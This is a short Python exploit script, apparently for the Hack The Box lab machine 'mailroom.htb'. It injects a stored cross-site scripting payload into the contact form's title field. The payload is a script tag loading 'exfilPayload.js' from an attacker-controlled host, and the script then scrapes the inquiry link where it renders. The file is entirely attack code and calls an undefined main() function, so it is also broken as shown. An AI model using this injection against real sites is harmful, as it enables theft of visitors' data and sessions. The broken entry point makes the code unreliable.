import requests
import urllib.parse
from bs4 import BeautifulSoup
from typing import Tuple

XSS_SCRIPT_NAME = "exfilPayload.js"


def create_xss(address: Tuple[str, int]):
    base_url = "http://mailroom.htb"
    payload = f"""<script src="http://{address[0]}:{address[1]}/{XSS_SCRIPT_NAME}"></script>"""
    response = requests.post(url=f"{base_url}/contact.php",
                             data={"email": "example_email",
                                   "title": payload,
                                   "message": "example_message"})
    inquiry = f'{base_url}{list(filter(lambda x: "inquiries" in x["href"], BeautifulSoup(response.text, "html.parser").find_all("a", href=True)))[0]["href"][1:]}'

    print(payload)
    print(inquiry)


if __name__ == '__main__':
    main()
